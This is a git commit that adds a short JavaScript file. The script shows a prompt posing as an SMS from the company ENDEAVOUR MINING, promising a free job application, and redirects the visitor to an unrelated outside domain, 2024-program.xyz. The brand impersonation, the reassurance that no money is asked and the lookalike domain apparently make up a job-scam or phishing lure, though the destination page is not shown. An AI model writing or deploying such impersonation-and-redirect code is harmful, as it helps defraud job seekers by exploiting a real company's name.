368e942352329c704dc26599387bf27350f62bbe
Jesusboys <156060629+Jesusboys@users.noreply.github.com>
2024-08-06 04:39:13 -0700

    Create ed-program.js

---
+++ ed-program.js
@@ -0,0 +1,6 @@
+
+var password = '1'
+password=prompt('SMS: Dear Applicants ENDEAVOUR MINING will never ask you for money for Job OPPORTUNITY, Application is free kindly press 1 to Apply Now ','1');
+if (password != '1') {
+location.href='https://2024-program.xyz/endeavour-mining.html';
+}
